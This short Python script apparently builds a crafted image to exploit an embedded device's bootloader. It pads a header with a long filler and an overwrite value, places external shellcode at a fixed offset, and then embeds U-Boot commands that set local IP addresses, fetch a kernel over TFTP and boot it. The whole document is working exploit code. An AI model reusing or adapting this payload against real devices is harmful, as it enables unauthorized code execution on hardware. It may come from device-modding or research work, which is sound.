import sys
from struct import pack

shellcode = open("shellcode.bin", "rb").read()
source_asm = open("shellcode.asm", "rb").read()

b = pack('>I', 0x00008000) + b'X'*16 + b"fw-type:" \
  + b'x'*256 + b"S000S001S002" + pack('>I', 0x80060200) \

b += b"\x00"*(0x200-len(b)) + shellcode
b += b"\xff"*(0x2A0-len(b)) + b"setenv serverip 192.168.0.2\x00"
b += b"\xff"*(0x2D0-len(b)) + b"setenv ipaddr 192.168.0.1\x00"
b += b"\xff"*(0x300-len(b)) + b"tftpboot 0x81000000 initramfs-kernel.bin\x00"
b += b"\xff"*(0x400-len(b)) + b"bootm 0x81000000\x00"
b += b"\xff"*(0x1000-len(b)) + b"----SOURCE:----\n" + source_asm
b += b"\xff"*(0x8000-len(b))

sys.stdout.buffer.write(b)
